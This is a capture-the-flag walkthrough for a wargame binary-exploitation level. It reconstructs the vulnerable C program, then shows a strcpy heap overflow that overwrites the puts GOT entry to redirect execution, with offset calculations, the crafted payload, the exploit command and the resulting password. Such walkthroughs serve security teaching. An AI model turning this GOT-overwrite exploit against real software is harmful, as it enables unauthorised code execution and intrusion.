# Level 7

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <string.h>

struct s {
    int id;
    void *ptr;
};

char c[80] = "";

void m()
{
    printf("%s - %d\n", c, time(0));
}

int main(int argc, char **argv)
{
    struct s *buffer1;
    struct s *buffer2;

    buffer1 = malloc(8);
    buffer1->id = 1;
    buffer1->ptr = malloc(8);

    buffer2 = malloc(8);
    buffer2->id = 2;
    buffer2->ptr = malloc(8);

    strcpy(buffer1->ptr, argv[1]);
    strcpy(buffer2->ptr, argv[2]);

    fgets(c, 68, fopen("/home/user/level8/.pass", "r"));
    puts("~~");
    return 0;
}
```

Let's focus on the `main` function. It reads input from the command line then copies it to our buffer using `strcpy`, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes copied.

Since we're interacting with the heap here we won't have to worry about the stack layout, in this case we'll have to overflow the value pointed by `buffer1->ptr` until we reach `&buffer2->ptr` and write the address of the GOT entry of `puts` to it. Then, thanks to the second `strcpy`, we'll be able to overwrite the value that the GOT entry address for `puts` points to with the address of the `m` function.

Yet again this exercise utilizes PLT and GOT, so please refer to the [level5 walkthrough](../level5/walkthrough.md) for a detailed explanation of how it works.

We'll use `ltrace` to understand the memory allocations and calculate the size needed for the overflow:
```bash
$ ltrace ./level7 arg1 arg2
__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8) = 0x0804a008  #buffer1 = malloc(8);
malloc(8) = 0x0804a018  #buffer1->ptr = malloc(8);
malloc(8) = 0x0804a028  #buffer2 = malloc(8);
malloc(8) = 0x0804a038  #buffer2->ptr = malloc(8);
strcpy(0x0804a018, "arg1") = 0x0804a018
strcpy(0x0804a038, "arg2") = 0x0804a038
[...]
```

As mentioned before we want to overflow the value pointed by `buffer1->ptr` until we reach `&buffer2->ptr`. So let's calculate the offset needed:
```
buffer1->ptr = 0x0804a018
buffer2 = 0x0804a028
0x0804a028 - 0x0804a018 = 16 bytes

0x0804a028 + 4 bytes (because buffer->id is an int) = 0x0804a02c
&buffer2->ptr = 0x0804a02c

16 bytes + 4 bytes = 20 bytes of padding
```

Using GDB we find that the address of the `m` function is `0x080484f4` and that the address of the GOT entry for `puts` is `0x8049928`.

We can then craft our payload:
```
arg1 = padding + address of the GOT entry for puts
arg2 = address of m

arg1 = "\x90"*20 + "\x08\x04\x99\x28"
arg2 = "\x08\x04\x84\xf4"
```

Let's run our payload:
```bash
level7@RainFall:~$ ./level7 `python -c 'print("\x90"*20 + "\x08\x04\x99\x28"[::-1])'` `python -c 'print("\x08\x04\x84\xf4"[::-1])'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1702752190
```

We are now level8! Let's move on to the next level.
